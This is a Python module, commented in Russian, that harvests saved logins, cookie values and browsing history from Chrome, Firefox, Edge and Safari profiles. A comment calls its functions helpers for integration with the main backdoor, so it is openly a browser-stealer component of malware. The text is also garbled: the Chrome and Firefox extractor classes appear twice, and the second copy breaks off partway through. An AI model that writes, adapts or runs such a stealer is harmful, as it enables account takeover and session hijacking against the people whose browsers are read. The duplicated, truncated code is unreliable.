#!/usr/bin/env python3
"""
Модуль для извлечения данных браузеров: пароли, куки, история.
Поддерживает Chrome, Firefox, Edge, Safari.
"""

import os
import sys
import json
import sqlite3
import shutil
import tempfile
import platform
import logging
from typing import Dict, List, Any, Optional
from datetime import datetime

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class BrowserDataExtractor:
    """Класс для извлечения данных из браузеров."""
    
    def __init__(self):
        """Инициализация экстрактора."""
        self.platform = platform.system()
        self.browsers = {
            'chrome': ChromeExtractor(),
            'firefox': FirefoxExtractor(),
            'edge': EdgeExtractor(),
            'safari': SafariExtractor()
        }
        
    def get_available_browsers(self) -> List[str]:
        """Возвращает список доступных браузеров."""
        available = []
        for name, extractor in self.browsers.items():
            if extractor.is_installed():
                available.append(name)
        return available
    
    def extract_all_data(self, browser_name: str = None) -> Dict[str, Any]:
        """Извлекает все данные из указанного браузера или всех браузеров."""
        results = {
            "success": False,
            "browsers": {},
            "total_passwords": 0,
            "total_cookies": 0,
            "total_history": 0,
            "error": None
        }
        
        try:
            if browser_name:
                # Извлекаем из конкретного браузера
                if browser_name in self.browsers:
                    extractor = self.browsers[browser_name]
                    if extractor.is_installed():
                        browser_data = extractor.extract_all()
                        results["browsers"][browser_name] = browser_data
                        results["success"] = True
                        
                        # Подсчитываем общие данные
                        if browser_data.get("passwords"):
                            results["total_passwords"] += len(browser_data["passwords"])
                        if browser_data.get("cookies"):
                            results["total_cookies"] += len(browser_data["cookies"])
                        if browser_data.get("history"):
                            results["total_history"] += len(browser_data["history"])
                    else:
                        results["error"] = f"Браузер {browser_name} не установлен"
                else:
                    results["error"] = f"Неподдерживаемый браузер: {browser_name}"
            else:
                # Извлекаем из всех браузеров
                for name, extractor in self.browsers.items():
                    if extractor.is_installed():
                        try:
                            browser_data = extractor.extract_all()
                            results["browsers"][name] = browser_data
                            
                            # Подсчитываем общие данные
                            if browser_data.get("passwords"):
                                results["total_passwords"] += len(browser_data["passwords"])
                            if browser_data.get("cookies"):
                                results["total_cookies"] += len(browser_data["cookies"])
                            if browser_data.get("history"):
                                results["total_history"] += len(browser_data["history"])
                                
                        except Exception as e:
                            logger.error(f"Ошибка извлечения данных из {name}: {e}")
                            results["browsers"][name] = {"error": str(e)}
                
                results["success"] = len(results["browsers"]) > 0
                
        except Exception as e:
            results["error"] = f"Ошибка извлечения данных: {e}"
            logger.error(f"Ошибка извлечения данных: {e}")
        
        return results
    
    def extract_passwords(self, browser_name: str = None) -> Dict[str, Any]:
        """Извлекает пароли из браузеров."""
        results = {
            "success": False,
            "passwords": [],
            "error": None
        }
        
        try:
            if browser_name:
                # Извлекаем из конкретного браузера
                if browser_name in self.browsers:
                    extractor = self.browsers[browser_name]
                    if extractor.is_installed():
                        passwords = extractor.extract_passwords()
                        results["passwords"] = passwords
                        results["success"] = True
                    else:
                        results["error"] = f"Браузер {browser_name} не установлен"
                else:
                    results["error"] = f"Неподдерживаемый браузер: {browser_name}"
            else:
                # Извлекаем из всех браузеров
                for name, extractor in self.browsers.items():
                    if extractor.is_installed():
                        try:
                            passwords = extractor.extract_passwords()
                            for pwd in passwords:
                                pwd["browser"] = name
                                results["passwords"].append(pwd)
                        except Exception as e:
                            logger.error(f"Ошибка извлечения паролей из {name}: {e}")
                
                results["success"] = len(results["passwords"]) > 0
                
        except Exception as e:
            results["error"] = f"Ошибка извлечения паролей: {e}"
            logger.error(f"Ошибка извлечения паролей: {e}")
        
        return results
    
    def extract_cookies(self, browser_name: str = None) -> Dict[str, Any]:
        """Извлекает куки из браузеров."""
        results = {
            "success": False,
            "cookies": [],
            "error": None
        }
        
        try:
            if browser_name:
                # Извлекаем из конкретного браузера
                if browser_name in self.browsers:
                    extractor = self.browsers[browser_name]
                    if extractor.is_installed():
                        cookies = extractor.extract_cookies()
                        results["cookies"] = cookies
                        results["success"] = True
                    else:
                        results["error"] = f"Браузер {browser_name} не установлен"
                else:
                    results["error"] = f"Неподдерживаемый браузер: {browser_name}"
            else:
                # Извлекаем из всех браузеров
                for name, extractor in self.browsers.items():
                    if extractor.is_installed():
                        try:
                            cookies = extractor.extract_cookies()
                            for cookie in cookies:
                                cookie["browser"] = name
                                results["cookies"].append(cookie)
                        except Exception as e:
                            logger.error(f"Ошибка извлечения куки из {name}: {e}")
                
                results["success"] = len(results["cookies"]) > 0
                
        except Exception as e:
            results["error"] = f"Ошибка извлечения куки: {e}"
            logger.error(f"Ошибка извлечения куки: {e}")
        
        return results
    
    def extract_history(self, browser_name: str = None) -> Dict[str, Any]:
        """Извлекает историю из браузеров."""
        results = {
            "success": False,
            "history": [],
            "error": None
        }
        
        try:
            if browser_name:
                # Извлекаем из конкретного браузера
                if browser_name in self.browsers:
                    extractor = self.browsers[browser_name]
                    if extractor.is_installed():
                        history = extractor.extract_history()
                        results["history"] = history
                        results["success"] = True
                    else:
                        results["error"] = f"Браузер {browser_name} не установлен"
                else:
                    results["error"] = f"Неподдерживаемый браузер: {browser_name}"
            else:
                # Извлекаем из всех браузеров
                for name, extractor in self.browsers.items():
                    if extractor.is_installed():
                        try:
                            history = extractor.extract_history()
                            for entry in history:
                                entry["browser"] = name
                                results["history"].append(entry)
                        except Exception as e:
                            logger.error(f"Ошибка извлечения истории из {name}: {e}")
                
                results["success"] = len(results["history"]) > 0
                
        except Exception as e:
            results["error"] = f"Ошибка извлечения истории: {e}"
            logger.error(f"Ошибка извлечения истории: {e}")
        
        return results


class ChromeExtractor:
    """Экстрактор данных для Chrome."""
    
    def __init__(self):
        """Инициализация Chrome экстрактора."""
        self.platform = platform.system()
        self.chrome_paths = self._get_chrome_paths()
        
    def _get_chrome_paths(self) -> Dict[str, str]:
        """Получает пути к данным Chrome."""
        paths = {}
        
        if self.platform == "Windows":
            appdata = os.getenv('LOCALAPPDATA')
            paths = {
                "profile": os.path.join(appdata, "Google", "Chrome", "User Data", "Default"),
                "login_data": os.path.join(appdata, "Google", "Chrome", "User Data", "Default", "Login Data"),
                "cookies": os.path.join(appdata, "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
                "history": os.path.join(appdata, "Google", "Chrome", "User Data", "Default", "History")
            }
        elif self.platform == "Darwin":  # macOS
            home = os.path.expanduser("~")
            paths = {
                "profile": os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default"),
                "login_data": os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data"),
                "cookies": os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Cookies"),
                "history": os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "History")
            }
        else:  # Linux
            home = os.path.expanduser("~")
            paths = {
                "profile": os.path.join(home, ".config", "google-chrome", "Default"),
                "login_data": os.path.join(home, ".config", "google-chrome", "Default", "Login Data"),
                "cookies": os.path.join(home, ".config", "google-chrome", "Default", "Cookies"),
                "history": os.path.join(home, ".config", "google-chrome", "Default", "History")
            }
        
        return paths
    
    def is_installed(self) -> bool:
        """Проверяет, установлен ли Chrome."""
        return os.path.exists(self.chrome_paths["profile"])
    
    def extract_passwords(self) -> List[Dict[str, Any]]:
        """Извлекает пароли из Chrome."""
        passwords = []
        
        try:
            login_data_path = self.chrome_paths["login_data"]
            if not os.path.exists(login_data_path):
                return passwords
            
            # Копируем файл во временную директорию
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "login_data_temp")
            shutil.copy2(login_data_path, temp_db)
            
            # Подключаемся к базе данных
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Извлекаем пароли
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created, date_last_used
                FROM logins
            """)
            
            for row in cursor.fetchall():
                origin_url, username, encrypted_password, date_created, date_last_used = row
                
                # Пока просто сохраняем зашифрованные пароли
                passwords.append({
                    "url": origin_url,
                    "username": username,
                    "password": "[ENCRYPTED]",
                    "date_created": date_created,
                    "date_last_used": date_last_used
                })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            logger.error(f"Ошибка извлечения паролей Chrome: {e}")
        
        return passwords
    
    def extract_cookies(self) -> List[Dict[str, Any]]:
        """Извлекает куки из Chrome."""
        cookies = []
        
        try:
            cookies_path = self.chrome_paths["cookies"]
            if not os.path.exists(cookies_path):
                return cookies
            
            # Копируем файл во временную директорию
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "cookies_temp")
            shutil.copy2(cookies_path, temp_db)
            
            # Подключаемся к базе данных
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Извлекаем куки
            cursor.execute("""
                SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly
                FROM cookies
            """)
            
            for row in cursor.fetchall():
                host_key, name, value, path, expires_utc, is_secure, is_httponly = row
                
                cookies.append({
                    "domain": host_key,
                    "name": name,
                    "value": value,
                    "path": path,
                    "expires": expires_utc,
                    "secure": bool(is_secure),
                    "httponly": bool(is_httponly)
                })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            logger.error(f"Ошибка извлечения куки Chrome: {e}")
        
        return cookies
    
    def extract_history(self) -> List[Dict[str, Any]]:
        """Извлекает историю из Chrome."""
        history = []
        
        try:
            history_path = self.chrome_paths["history"]
            if not os.path.exists(history_path):
                return history
            
            # Копируем файл во временную директорию
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "history_temp")
            shutil.copy2(history_path, temp_db)
            
            # Подключаемся к базе данных
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Извлекаем историю
            cursor.execute("""
                SELECT url, title, visit_count, last_visit_time
                FROM urls
                ORDER BY last_visit_time DESC
                LIMIT 1000
            """)
            
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_time = row
                
                history.append({
                    "url": url,
                    "title": title,
                    "visit_count": visit_count,
                    "last_visit": last_visit_time
                })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            logger.error(f"Ошибка извлечения истории Chrome: {e}")
        
        return history
    
    def extract_all(self) -> Dict[str, Any]:
        """Извлекает все данные из Chrome."""
        return {
            "passwords": self.extract_passwords(),
            "cookies": self.extract_cookies(),
            "history": self.extract_history()
        }


class FirefoxExtractor:
    """Экстрактор данных для Firefox."""
    
    def __init__(self):
        """Инициализация Firefox экстрактора."""
        self.platform = platform.system()
        self.firefox_paths = self._get_firefox_paths()
        
    def _get_firefox_paths(self) -> Dict[str, str]:
        """Получает пути к данным Firefox."""
        paths = {}
        
        if self.platform == "Windows":
            appdata = os.getenv('APPDATA')
            paths = {
                "profile": os.path.join(appdata, "Mozilla", "Firefox", "Profiles"),
                "profiles_ini": os.path.join(appdata, "Mozilla", "Firefox", "profiles.ini")
            }
        elif self.platform == "Darwin":  # macOS
            home = os.path.expanduser("~")
            paths = {
                "profile": os.path.join(home, "Library", "Application Support", "Firefox", "Profiles"),
                "profiles_ini": os.path.join(home, "Library", "Application Support", "Firefox", "profiles.ini")
            }
        else:  # Linux
            home = os.path.expanduser("~")
            paths = {
                "profile": os.path.join(home, ".mozilla", "firefox"),
                "profiles_ini": os.path.join(home, ".mozilla", "firefox", "profiles.ini")
            }
        
        return paths
    
    def is_installed(self) -> bool:
        """Проверяет, установлен ли Firefox."""
        return os.path.exists(self.firefox_paths["profiles_ini"])
    
    def _get_profile_path(self) -> str:
        """Получает путь к профилю Firefox."""
        try:
            profiles_ini = self.firefox_paths["profiles_ini"]
            if not os.path.exists(profiles_ini):
                return ""
            
            with open(profiles_ini, 'r') as f:
                for line in f:
                    if line.startswith('Path='):
                        profile_name = line.split('=')[1].strip()
                        return os.path.join(self.firefox_paths["profile"], profile_name)
        except Exception as e:
            logger.error(f"Ошибка получения профиля Firefox: {e}")
        return ""
    
    def extract_passwords(self) -> List[Dict[str, Any]]:
        """Извлекает пароли из Firefox."""
        passwords = []
        
        try:
            profile_path = self._get_profile_path()
            if not profile_path:
                return passwords
            
            # Ищем файл logins.json
            logins_file = os.path.join(profile_path, "logins.json")
            if not os.path.exists(logins_file):
                return passwords
            
            with open(logins_file, 'r') as f:
                logins_data = json.load(f)
            
            # Извлекаем пароли из logins.json
            for login in logins_data.get("logins", []):
                passwords.append({
                    "url": login.get("hostname", ""),
                    "username": login.get("encryptedUsername", ""),
                    "password": login.get("encryptedPassword", ""),
                    "date_created": login.get("timeCreated", 0),
                    "date_last_used": login.get("timeLastUsed", 0)
                })
            
        except Exception as e:
            logger.error(f"Ошибка извлечения паролей Firefox: {e}")
        
        return passwords
    
    def extract_cookies(self) -> List[Dict[str, Any]]:
        """Извлекает куки из Firefox."""
        cookies = []
        
        try:
            profile_path = self._get_profile_path()
            if not profile_path:
                return cookies
            
            # Ищем файл cookies.sqlite
            cookies_file = os.path.join(profile_path, "cookies.sqlite")
            if not os.path.exists(cookies_file):
                return cookies
            
            # Копируем файл во временную директорию
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "cookies_temp")
            shutil.copy2(cookies_file, temp_db)
            
            # Подключаемся к базе данных
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Извлекаем куки
            cursor.execute("""
                SELECT host, name, value, path, expiry, isSecure, isHttpOnly
                FROM moz_cookies
            """)
            
            for row in cursor.fetchall():
                host, name, value, path, expiry, is_secure, is_httponly = row
                
                cookies.append({
                    "domain": host,
                    "name": name,
                    "value": value,
                    "path": path,
                    "expires": expiry,
                    "secure": bool(is_secure),
                    "httponly": bool(is_httponly)
                })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            logger.error(f"Ошибка извлечения куки Firefox: {e}")
        
        return cookies
    
    def extract_history(self) -> List[Dict[str, Any]]:
        """Извлекает историю из Firefox."""
        history = []
        
        try:
            profile_path = self._get_profile_path()
            if not profile_path:
                return history
            
            # Ищем файл places.sqlite
            places_file = os.path.join(profile_path, "places.sqlite")
            if not os.path.exists(places_file):
                return history
            
            # Копируем файл во временную директорию
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "places_temp")
            shutil.copy2(places_file, temp_db)
            
            # Подключаемся к базе данных
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Извлекаем историю
            cursor.execute("""
                SELECT url, title, visit_count, last_visit_date
                FROM moz_places
                WHERE url IS NOT NULL
                ORDER BY last_visit_date DESC
                LIMIT 1000
            """)
            
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_date = row
                
                history.append({
                    "url": url,
                    "title": title,
                    "visit_count": visit_count,
                    "last_visit": last_visit_date
                })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            logger.error(f"Ошибка извлечения истории Firefox: {e}")
        
        return history
    
    def extract_all(self) -> Dict[str, Any]:
        """Извлекает все данные из Firefox."""
        return {
            "passwords": self.extract_passwords(),
            "cookies": self.extract_cookies(),
            "history": self.extract_history()
        }


class EdgeExtractor:
    """Экстрактор данных для Edge."""
    
    def __init__(self):
        """Инициализация Edge экстрактора."""
        self.platform = platform.system()
        self.edge_paths = self._get_edge_paths()
        
    def _get_edge_paths(self) -> Dict[str, str]:
        """Получает пути к данным Edge."""
        paths = {}
        
        if self.platform == "Windows":
            appdata = os.getenv('LOCALAPPDATA')
            paths = {
                "profile": os.path.join(appdata, "Microsoft", "Edge", "User Data", "Default"),
                "login_data": os.path.join(appdata, "Microsoft", "Edge", "User Data", "Default", "Login Data"),
                "cookies": os.path.join(appdata, "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
                "history": os.path.join(appdata, "Microsoft", "Edge", "User Data", "Default", "History")
            }
        else:
            # Edge доступен только на Windows
            paths = {}
        
        return paths
    
    def is_installed(self) -> bool:
        """Проверяет, установлен ли Edge."""
        return self.platform == "Windows" and os.path.exists(self.edge_paths.get("profile", ""))
    
    def extract_passwords(self) -> List[Dict[str, Any]]:
        """Извлекает пароли из Edge."""
        # Edge использует ту же структуру, что и Chrome
        chrome_extractor = ChromeExtractor()
        chrome_extractor.chrome_paths = self.edge_paths
        return chrome_extractor.extract_passwords()
    
    def extract_cookies(self) -> List[Dict[str, Any]]:
        """Извлекает куки из Edge."""
        # Edge использует ту же структуру, что и Chrome
        chrome_extractor = ChromeExtractor()
        chrome_extractor.chrome_paths = self.edge_paths
        return chrome_extractor.extract_cookies()
    
    def extract_history(self) -> List[Dict[str, Any]]:
        """Извлекает историю из Edge."""
        # Edge использует ту же структуру, что и Chrome
        chrome_extractor = ChromeExtractor()
        chrome_extractor.chrome_paths = self.edge_paths
        return chrome_extractor.extract_history()
    
    def extract_all(self) -> Dict[str, Any]:
        """Извлекает все данные из Edge."""
        return {
            "passwords": self.extract_passwords(),
            "cookies": self.extract_cookies(),
            "history": self.extract_history()
        }


class SafariExtractor:
    """Экстрактор данных для Safari."""
    
    def __init__(self):
        """Инициализация Safari экстрактора."""
        self.platform = platform.system()
        self.safari_paths = self._get_safari_paths()
        
    def _get_safari_paths(self) -> Dict[str, str]:
        """Получает пути к данным Safari."""
        paths = {}
        
        if self.platform == "Darwin":  # macOS
            home = os.path.expanduser("~")
            paths = {
                "profile": os.path.join(home, "Library", "Safari"),
                "history": os.path.join(home, "Library", "Safari", "History.db")
            }
        
        return paths
    
    def is_installed(self) -> bool:
        """Проверяет, установлен ли Safari."""
        return self.platform == "Darwin" and os.path.exists(self.safari_paths.get("profile", ""))
    
    def extract_passwords(self) -> List[Dict[str, Any]]:
        """Извлекает пароли из Safari."""
        # Safari хранит пароли в Keychain
        return []
    
    def extract_cookies(self) -> List[Dict[str, Any]]:
        """Извлекает куки из Safari."""
        # Safari использует бинарный формат для куки
        return []
    
    def extract_history(self) -> List[Dict[str, Any]]:
        """Извлекает историю из Safari."""
        history = []
        try:
            history_file = self.safari_paths.get("history")
            if not history_file or not os.path.exists(history_file):
                return history
            
            # Копируем файл во временную директорию
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "history_temp")
            shutil.copy2(history_file, temp_db)
            
            # Подключаемся к базе данных
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Извлекаем историю
            cursor.execute("""
                SELECT url, title, visit_count, last_visit_time
                FROM history_items
                ORDER BY last_visit_time DESC
                LIMIT 1000
            """)
            
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_time = row
                
                history.append({
                    "url": url,
                    "title": title,
                    "visit_count": visit_count,
                    "last_visit": last_visit_time
                })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            logger.error(f"Ошибка извлечения истории Safari: {e}")
        
        return history
    
    def extract_all(self) -> Dict[str, Any]:
        """Извлекает все данные из Safari."""
        return {
            "passwords": self.extract_passwords(),
            "cookies": self.extract_cookies(),
            "history": self.extract_history()
        }


# Функции для интеграции с основным бэкдором

def create_browser_extractor() -> BrowserDataExtractor:
    """Создает экземпляр BrowserDataExtractor."""
    return BrowserDataExtractor()

def extract_browser_passwords(browser_name: str = None) -> Dict[str, Any]:
    """Извлекает пароли из браузеров."""
    extractor = BrowserDataExtractor()
    return extractor.extract_passwords(browser_name)

def extract_browser_cookies(browser_name: str = None) -> Dict[str, Any]:
    """Извлекает куки из браузеров."""
    extractor = BrowserDataExtractor()
    return extractor.extract_cookies(browser_name)

def extract_browser_history(browser_name: str = None) -> Dict[str, Any]:
    """Извлекает историю из браузеров."""
    extractor = BrowserDataExtractor()
    return extractor.extract_history(browser_name)

def extract_all_browser_data(browser_name: str = None) -> Dict[str, Any]:
    """Извлекает все данные из браузеров."""
    extractor = BrowserDataExtractor()
    return extractor.extract_all_data(browser_name)

def test_browser_extraction():
    """Тестирует функции извлечения данных браузеров."""
    print("🧪 Тестирование Browser Data Extraction")
    print("=" * 50)
    
    extractor = BrowserDataExtractor()
    
    print("📊 Доступные браузеры:")
    available_browsers = extractor.get_available_browsers()
    for browser in available_browsers:
        print(f"  - {browser}")
    
    if not available_browsers:
        print("  ❌ Не найдено установленных браузеров")
        return
    
    print(f"\n🔍 Тестирование извлечения данных:")
    
    # Тестируем извлечение паролей
    print("\n🔐 Пароли:")
    passwords_result = extractor.extract_passwords()
    if passwords_result["success"]:
        print(f"  ✅ Найдено паролей: {len(passwords_result['passwords'])}")
        for pwd in passwords_result["passwords"][:3]:  # Показываем первые 3
            print(f"    - {pwd['url']}: {pwd['username']}")
    else:
        print(f"  ❌ Ошибка: {passwords_result['error']}")
    
    # Тестируем извлечение куки
    print("\n🍪 Куки:")
    cookies_result = extractor.extract_cookies()
    if cookies_result["success"]:
        print(f"  ✅ Найдено куки: {len(cookies_result['cookies'])}")
        for cookie in cookies_result["cookies"][:3]:  # Показываем первые 3
            print(f"    - {cookie['domain']}: {cookie['name']}")
    else:
        print(f"  ❌ Ошибка: {cookies_result['error']}")
    
    # Тестируем извлечение истории
    print("\n📚 История:")
    history_result = extractor.extract_history()
    if history_result["success"]:
        print(f"  ✅ Найдено записей истории: {len(history_result['history'])}")
        for entry in history_result["history"][:3]:  # Показываем первые 3
            print(f"    - {entry['url']}")
    else:
        print(f"  ❌ Ошибка: {history_result['error']}")
    
    print(f"\n✅ Тестирование завершено")


class ChromeExtractor:
    """Экстрактор данных для Chrome."""
    
    def __init__(self):
        """Инициализация Chrome экстрактора."""
        self.platform = platform.system()
        self.chrome_paths = self._get_chrome_paths()
        
    def _get_chrome_paths(self) -> Dict[str, str]:
        """Получает пути к данным Chrome."""
        paths = {}
        
        if self.platform == "Windows":
            appdata = os.getenv('LOCALAPPDATA')
            paths = {
                "profile": os.path.join(appdata, "Google", "Chrome", "User Data", "Default"),
                "login_data": os.path.join(appdata, "Google", "Chrome", "User Data", "Default", "Login Data"),
                "cookies": os.path.join(appdata, "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
                "history": os.path.join(appdata, "Google", "Chrome", "User Data", "Default", "History")
            }
        elif self.platform == "Darwin":  # macOS
            home = os.path.expanduser("~")
            paths = {
                "profile": os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default"),
                "login_data": os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data"),
                "cookies": os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Cookies"),
                "history": os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "History")
            }
        else:  # Linux
            home = os.path.expanduser("~")
            paths = {
                "profile": os.path.join(home, ".config", "google-chrome", "Default"),
                "login_data": os.path.join(home, ".config", "google-chrome", "Default", "Login Data"),
                "cookies": os.path.join(home, ".config", "google-chrome", "Default", "Cookies"),
                "history": os.path.join(home, ".config", "google-chrome", "Default", "History")
            }
        
        return paths
    
    def is_installed(self) -> bool:
        """Проверяет, установлен ли Chrome."""
        return os.path.exists(self.chrome_paths["profile"])
    
    def extract_passwords(self) -> List[Dict[str, Any]]:
        """Извлекает пароли из Chrome."""
        passwords = []
        
        try:
            login_data_path = self.chrome_paths["login_data"]
            if not os.path.exists(login_data_path):
                return passwords
            
            # Копируем файл во временную директорию
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "login_data_temp")
            shutil.copy2(login_data_path, temp_db)
            
            # Подключаемся к базе данных
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Извлекаем пароли
            cursor.execute("""
                SELECT origin_url, username_value, password_value, date_created, date_last_used
                FROM logins
            """)
            
            for row in cursor.fetchall():
                origin_url, username, encrypted_password, date_created, date_last_used = row
                
                # Пока просто сохраняем зашифрованные пароли
                passwords.append({
                    "url": origin_url,
                    "username": username,
                    "password": "[ENCRYPTED]",
                    "date_created": date_created,
                    "date_last_used": date_last_used
                })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            logger.error(f"Ошибка извлечения паролей Chrome: {e}")
        
        return passwords
    
    def extract_cookies(self) -> List[Dict[str, Any]]:
        """Извлекает куки из Chrome."""
        cookies = []
        
        try:
            cookies_path = self.chrome_paths["cookies"]
            if not os.path.exists(cookies_path):
                return cookies
            
            # Копируем файл во временную директорию
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "cookies_temp")
            shutil.copy2(cookies_path, temp_db)
            
            # Подключаемся к базе данных
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Извлекаем куки
            cursor.execute("""
                SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly
                FROM cookies
            """)
            
            for row in cursor.fetchall():
                host_key, name, value, path, expires_utc, is_secure, is_httponly = row
                
                cookies.append({
                    "domain": host_key,
                    "name": name,
                    "value": value,
                    "path": path,
                    "expires": expires_utc,
                    "secure": bool(is_secure),
                    "httponly": bool(is_httponly)
                })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            logger.error(f"Ошибка извлечения куки Chrome: {e}")
        
        return cookies
    
    def extract_history(self) -> List[Dict[str, Any]]:
        """Извлекает историю из Chrome."""
        history = []
        
        try:
            history_path = self.chrome_paths["history"]
            if not os.path.exists(history_path):
                return history
            
            # Копируем файл во временную директорию
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "history_temp")
            shutil.copy2(history_path, temp_db)
            
            # Подключаемся к базе данных
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Извлекаем историю
            cursor.execute("""
                SELECT url, title, visit_count, last_visit_time
                FROM urls
                ORDER BY last_visit_time DESC
                LIMIT 1000
            """)
            
            for row in cursor.fetchall():
                url, title, visit_count, last_visit_time = row
                
                history.append({
                    "url": url,
                    "title": title,
                    "visit_count": visit_count,
                    "last_visit": last_visit_time
                })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            logger.error(f"Ошибка извлечения истории Chrome: {e}")
        
        return history
    
    def extract_all(self) -> Dict[str, Any]:
        """Извлекает все данные из Chrome."""
        return {
            "passwords": self.extract_passwords(),
            "cookies": self.extract_cookies(),
            "history": self.extract_history()
        }


class FirefoxExtractor:
    """Экстрактор данных для Firefox."""
    
    def __init__(self):
        """Инициализация Firefox экстрактора."""
        self.platform = platform.system()
        self.firefox_paths = self._get_firefox_paths()
        
    def _get_firefox_paths(self) -> Dict[str, str]:
        """Получает пути к данным Firefox."""
        paths = {}
        
        if self.platform == "Windows":
            appdata = os.getenv('APPDATA')
            paths = {
                "profile": os.path.join(appdata, "Mozilla", "Firefox", "Profiles"),
                "profiles_ini": os.path.join(appdata, "Mozilla", "Firefox", "profiles.ini")
            }
        elif self.platform == "Darwin":  # macOS
            home = os.path.expanduser("~")
            paths = {
                "profile": os.path.join(home, "Library", "Application Support", "Firefox", "Profiles"),
                "profiles_ini": os.path.join(home, "Library", "Application Support", "Firefox", "profiles.ini")
            }
        else:  # Linux
            home = os.path.expanduser("~")
            paths = {
                "profile": os.path.join(home, ".mozilla", "firefox"),
                "profiles_ini": os.path.join(home, ".mozilla", "firefox", "profiles.ini")
            }
        
        return paths
    
    def is_installed(self) -> bool:
        """Проверяет, установлен ли Firefox."""
        return os.path.exists(self.firefox_paths["profiles_ini"])
    
    def _get_profile_path(self) -> str:
        """Получает путь к профилю Firefox."""
        try:
            profiles_ini = self.firefox_paths["profiles_ini"]
            if not os.path.exists(profiles_ini):
                return ""
            
            with open(profiles_ini, 'r') as f:
                for line in f:
                    if line.startswith('Path='):
                        profile_name = line.split('=')[1].strip()
                        return os.path.join(self.firefox_paths["profile"], profile_name)
        except Exception as e:
            logger.error(f"Ошибка получения профиля Firefox: {e}")
        return ""
    
    def extract_passwords(self) -> List[Dict[str, Any]]:
        """Извлекает пароли из Firefox."""
        passwords = []
        
        try:
            profile_path = self._get_profile_path()
            if not profile_path:
                return passwords
            
            # Ищем файл logins.json
            logins_file = os.path.join(profile_path, "logins.json")
            if not os.path.exists(logins_file):
                return passwords
            
            with open(logins_file, 'r') as f:
                logins_data = json.load(f)
            
            # Извлекаем пароли из logins.json
            for login in logins_data.get("logins", []):
                passwords.append({
                    "url": login.get("hostname", ""),
                    "username": login.get("encryptedUsername", ""),
                    "password": login.get("encryptedPassword", ""),
                    "date_created": login.get("timeCreated", 0),
                    "date_last_used": login.get("timeLastUsed", 0)
                })
            
        except Exception as e:
            logger.error(f"Ошибка извлечения паролей Firefox: {e}")
        
        return passwords
    
    def extract_cookies(self) -> List[Dict[str, Any]]:
        """Извлекает куки из Firefox."""
        cookies = []
        
        try:
            profile_path = self._get_profile_path()
            if not profile_path:
                return cookies
            
            # Ищем файл cookies.sqlite
            cookies_file = os.path.join(profile_path, "cookies.sqlite")
            if not os.path.exists(cookies_file):
                return cookies
            
            # Копируем файл во временную директорию
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "cookies_temp")
            shutil.copy2(cookies_file, temp_db)
            
            # Подключаемся к базе данных
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Извлекаем куки
            cursor.execute("""
                SELECT host, name, value, path, expiry, isSecure, isHttpOnly
                FROM moz_cookies
            """)
            
            for row in cursor.fetchall():
                host, name, value, path, expiry, is_secure, is_httponly = row
                
                cookies.append({
                    "domain": host,
                    "name": name,
                    "value": value,
                    "path": path,
                    "expires": expiry,
                    "secure": bool(is_secure),
                    "httponly": bool(is_httponly)
                })
            
            conn.close()
            shutil.rmtree(temp_dir)
            
        except Exception as e:
            logger.error(f"Ошибка извлечения куки Firefox: {e}")
        
        return cookies
    
    def extract_history(self) -> List[Dict[str, Any]]:
        """Извлекает историю из Firefox."""
        history = []
        
        try:
            profile_path = self._get_profile_path()
            if not profile_path:
                return history
            
            # Ищем файл places.sqlite
            places_file = os.path.join(profile_path, "places.sqlite")
            if not os.path.exists(places_file):
                return history
            
            # Копируем файл во временную директорию
            temp_dir = tempfile.mkdtemp()
            temp_db = os.path.join(temp_dir, "places_temp")
